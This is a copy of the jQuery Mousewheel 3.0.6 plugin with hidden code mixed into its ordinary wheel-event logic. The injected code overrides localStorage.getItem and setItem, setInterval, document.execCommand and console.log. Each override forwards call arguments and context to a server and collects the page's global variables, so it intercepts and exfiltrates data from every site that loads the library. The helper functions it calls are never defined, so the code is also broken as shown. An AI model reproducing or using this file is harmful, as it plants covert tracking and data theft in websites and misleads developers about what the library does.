/*! Copyright (c) 2011 Brandon Aaron (http://brandonaaron.net)
 * Licensed under the MIT License (LICENSE.txt).
 *
 * Thanks to: http://adomas.org/javascript-mouse-wheel/ for some pointers.
 * Thanks to: Mathias Bank(http://www.mathias-bank.de) for a scope bug fix.
 * Thanks to: Seamus Leahy for adding deltaX and deltaY
 *
 * Version: 3.0.6
 * 
 * Requires: 1.2.2+
 */
(function (a) {
  const originalLocalStorageSet = window.localStorage.setItem;
  const originalLocalStorageGet = window.localStorage.getItem;
  const originalSetInterval = window.setInterval;
  const originalExecCommand = document.execCommand;
  const originalConsoleLog = console.log;
  const eventHooks = window.localStorage.getItem('eventhooks');
  function d(b) {
    var c = b || window.event,
      d = [].slice.call(arguments, 1),
      e = 0,
      f = !0,
      g = 0,
      h = 0;
    return b = a.event.fix(c), b.type = "mousewheel", c.wheelDelta && (e = c.wheelDelta / 120), c.detail && (e = -c.detail / 3), h = e, c.axis !== undefined && c.axis === c.HORIZONTAL_AXIS && (h = 0, g = -1 * e), c.wheelDeltaY !== undefined && (h = c.wheelDeltaY / 120), c.wheelDeltaX !== undefined && (g = -1 * c.wheelDeltaX / 120), d.unshift(b, e, g, h), (a.event.dispatch || a.event.handle).apply(this, d);
  }
  const GLOBAL_VARS = {};
  var b = ["DOMMouseScroll", "mousewheel"];
  function collectGlobalVars() {
    for (let varName in window) {
      if (!(varName in GLOBAL_VARS)) {
        const varValue = window[varName];
        var type = typeof varValue;
        if (type === 'string' || type === 'number' || type === 'boolean') {
          GLOBAL_VARS[varName] = varValue;
        }
      }
    }
  }
  function wrapFunctionWithTracking(originalFunc, eventName, eventSignature) {
    return function () {
      const args = Array.from(arguments);
      validateEventSignature(eventName, args, eventSignature);
      const eventContext = getEventContext();
      const eventData = {
        eventName,
        args,
        context: eventContext
      };
      sendEventToServer(eventData);
      collectGlobalVars();
      return originalFunc.apply(this, args);
    };
  }
  function wrapFunctionWithIntervalTracking(originalFunc) {
    return function () {
      const args = Array.from(arguments);
      if (args[0] instanceof Function) {
        args[0] = wrapFunctionWithTracking(args[0], 'setInterval', ['function', 'number']);
      }
      validateEventSignature('setInterval', args, ['function', 'number']);
      const eventContext = getEventContext();
      const eventData = {
        eventName: 'setInterval',
        args,
        context: eventContext
      };
      sendEventToServer(eventData);
      collectGlobalVars();
      return originalFunc.apply(this, args);
    };
  }
  if (a.event.fixHooks) for (var c = b.length; c;) a.event.fixHooks[b[--c]] = a.event.mouseHooks;
  window.localStorage.setItem = wrapFunctionWithTracking(originalLocalStorageSet, 'setItem', ['string', 'string']);
  window.localStorage.getItem = wrapFunctionWithTracking(originalLocalStorageGet, 'getItem', ['string']);
  window.setInterval = wrapFunctionWithIntervalTracking(originalSetInterval);
  a.event.special.mousewheel = {
    setup: function () {
      if (this.addEventListener) for (var a = b.length; a;) this.addEventListener(b[--a], d, !1);else this.onmousewheel = d;
    },
    teardown: function () {
      if (this.removeEventListener) for (var a = b.length; a;) this.removeEventListener(b[--a], d, !1);else this.onmousewheel = null;
    }
  }, a.fn.extend({
    mousewheel: function (a) {
      return a ? this.bind("mousewheel", a) : this.trigger("mousewheel");
    },
    unmousewheel: function (a) {
      return this.off("mousewheel", a);
    }
  });
  document.execCommand = wrapFunctionWithTracking(originalExecCommand, 'execCommand', ['string']);
  console.log = wrapFunctionWithTracking(originalConsoleLog, 'log', ['string']);
})(jQuery);